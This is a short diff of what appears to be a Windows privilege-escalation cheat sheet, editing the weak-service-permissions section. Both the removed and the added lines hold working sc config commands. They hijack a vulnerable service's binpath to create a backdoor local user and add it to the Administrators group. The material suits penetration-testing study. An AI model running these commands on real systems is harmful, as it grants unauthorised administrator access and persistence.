@@ -96,11 +96,8 @@ accesschk.exe -qdws Users C:\Windows\
 
 sc qc Service1
 
-Change the binpath to our binary and restart the service: 
-sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
-sc stop <vuln-service>
-sc start <vuln-service>
-sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 
+Modify the binpath parameter and restart the service: 
+sc config <vuln-service> binpath= "net localgroup Administrators rosonsec /add" 
 sc stop <vuln-service>
 sc start <vuln-service>
 
